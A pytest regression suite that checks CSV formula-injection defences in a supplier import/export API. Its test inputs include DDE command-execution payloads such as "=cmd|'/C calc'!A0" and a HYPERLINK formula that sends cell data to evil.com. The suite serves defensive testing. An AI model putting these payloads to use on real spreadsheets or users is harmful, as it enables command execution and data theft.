"""
test_csv_formula_injection.py
==============================
Security regression test suite for CSV Formula Injection (CWE-1236).
Validates:
1. Low-level sanitization across all dangerous formula prefixes:
   - '=', '+', '-', '@', '\\t', '\\r', '|'
   - Whitespace, newline, and control character bypass attempts
2. Safe RFC-4180 CSV serialization with single apostrophe neutralization
3. Safe supplier CSV import API endpoint (/api/suppliers/import-csv)
4. Safe supplier CSV export API endpoint (/api/suppliers/export-csv)
5. Parsing exported CSV bytes to verify no cell can be interpreted as an executable formula
6. Stored legitimate business names are not corrupted
"""

from __future__ import annotations

import csv
import io
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.core.csv_security import (
    is_formula_injection,
    sanitize_cell_for_export,
    validate_and_sanitize_import_field,
    export_csv_secure
)

client = TestClient(app)


# ---------------------------------------------------------------------------
# 1. Low-Level Sanitization Tests
# ---------------------------------------------------------------------------

class TestCsvSecurityCore:

    @pytest.mark.parametrize("payload", [
        "=SUM(1+1)",
        "@SUM(A1:A2)",
        "+1+1",
        "-1+1",
        "=cmd|'/C calc'!A0",
        "@cmd|'/C calc'!A0",
        "+cmd|'/C calc'!A0",
        "-cmd|'/C calc'!A0",
        "\t=2+2",
        "  =SUM(1+2)",
        "\r=10*10",
        "\n=AVERAGE(A1:A10)",
        "   @HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click Me\")",
        " +100-200",
        " -5+10"
    ])
    def test_detects_dangerous_formula_payloads(self, payload: str):
        assert is_formula_injection(payload) is True, f"Failed to detect dangerous formula: {repr(payload)}"

    @pytest.mark.parametrize("payload", [
        "Acme Global Inc.",
        "Precision Fasteners Ltd.",
        "Taiwan Fab 4",
        "MCU-9021",
        "C-100",
        "San Francisco, CA",
        "100.50",
        "Tier 1"
    ])
    def test_allows_benign_business_values(self, payload: str):
        assert is_formula_injection(payload) is False, f"Falsely flagged benign value: {repr(payload)}"

    def test_sanitize_cell_prepends_quote_on_injection(self):
        dangerous = "=SUM(1+1)"
        sanitized = sanitize_cell_for_export(dangerous)
        assert sanitized == "'=SUM(1+1)"

        whitespace_dangerous = "  @cmd|calc"
        sanitized_ws = sanitize_cell_for_export(whitespace_dangerous)
        assert sanitized_ws == "'  @cmd|calc"

        # Benign is unchanged
        assert sanitize_cell_for_export("Acme Corp") == "Acme Corp"
        assert sanitize_cell_for_export(1234) == "1234"
        assert sanitize_cell_for_export(None) == ""

    def test_export_csv_secure_neutralizes_all_dangerous_cells(self):
        headers = ["Code", "Name", "FormulaTest", "WhitespaceFormula"]
        rows = [
            ["SUP-01", "Acme", "=SUM(1+1)", "\t@SUM(A1:A2)"],
            ["SUP-02", "Initech", "+10+20", " -15-5"],
            ["SUP-03", "=MALICIOUS", "Legit Name", "=HYPERLINK(\"http://evil.com\")"]
        ]

        csv_text = export_csv_secure(headers, rows)

        # Parse CSV back using standard CSV parser to inspect raw cell strings
        reader = csv.reader(io.StringIO(csv_text))
        parsed_rows = list(reader)

        assert len(parsed_rows) == 4  # header + 3 rows

        # Inspect cell tokens
        for row in parsed_rows[1:]:
            for cell in row:
                # In spreadsheet software, formula evaluation only triggers if cell starts with =, +, -, @, \t, \r
                # Every dangerous cell must now start with an apostrophe '
                stripped = cell.lstrip()
                if any(stripped.startswith(p) for p in ("=", "+", "-", "@", "|")):
                    assert cell.startswith("'"), f"Cell {repr(cell)} was not neutralized with an apostrophe!"


# ---------------------------------------------------------------------------
# 2. API Endpoint Regression Tests
# ---------------------------------------------------------------------------

class TestCsvApiEndpoints:

    def test_import_suppliers_csv_neutralizes_dangerous_formulas(self):
        payload = {
            "rows": [
                {
                    "code": "=SUM(1+1)",
                    "name": "@Malicious Corp",
                    "contactName": "+1-800-MALICIOUS",
                    "dailyCapacity": 1200,
                    "costPerUnit": 45.0,
                    "reliabilityScore": 92
                },
                {
                    "code": "\t-EXCEL_PAYLOAD",
                    "name": "   =HYPERLINK(\"http://evil.com\")",
                    "dailyCapacity": 2000,
                    "costPerUnit": 50.0,
                    "reliabilityScore": 95
                },
                {
                    "code": "LEGIT-01",
                    "name": "Legitimate Electronics",
                    "dailyCapacity": 3000,
                    "costPerUnit": 40.0,
                    "reliabilityScore": 99
                }
            ],
            "managerRole": "Supply Chain Security Auditor"
        }

        res = client.post("/api/suppliers/import-csv", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["success"] is True
        assert data["importedCount"] == 3

        # Verify state content in database
        state = client.get("/api/state").json()
        suppliers = state["suppliers"]

        s1 = next(s for s in suppliers if "Malicious Corp" in s["name"])
        assert s1["code"].startswith("'="), f"Code should be neutralized: {s1['code']}"
        assert s1["name"].startswith("'@"), f"Name should be neutralized: {s1['name']}"

        s2 = next(s for s in suppliers if "HYPERLINK" in s["name"])
        assert s2["code"].startswith("'-"), f"Code should be neutralized: {s2['code']}"
        assert s2["name"].startswith("'="), f"Name should be neutralized: {s2['name']}"

        s3 = next(s for s in suppliers if s["code"] == "LEGIT-01")
        assert s3["name"] == "Legitimate Electronics"
        assert s3["code"] == "LEGIT-01"  # Legitimate is not mangled

    def test_export_suppliers_csv_produces_safe_spreadsheet(self):
        res = client.get("/api/suppliers/export-csv")
        assert res.status_code == 200
        assert "text/csv" in res.headers["content-type"]
        assert "attachment; filename=" in res.headers["content-disposition"]

        csv_content = res.text
        reader = csv.reader(io.StringIO(csv_content))
        rows = list(reader)

        assert len(rows) > 1  # Headers + data rows
        headers = rows[0]
        assert "Code" in headers
        assert "Name" in headers

        # Verify no cell begins with unescaped formula triggers
        for row_idx, row in enumerate(rows[1:], start=2):
            for col_idx, cell in enumerate(row):
                if cell.strip():
                    stripped = cell.strip()
                    # If cell begins with a formula symbol, it MUST be safely quoted with leading apostrophe
                    if any(stripped.startswith(p) for p in ("=", "+", "-", "@", "|")):
                        assert cell.startswith("'"), (
                            f"Row {row_idx}, Col {col_idx} '{headers[col_idx]}' has unescaped formula trigger: {repr(cell)}"
                        )
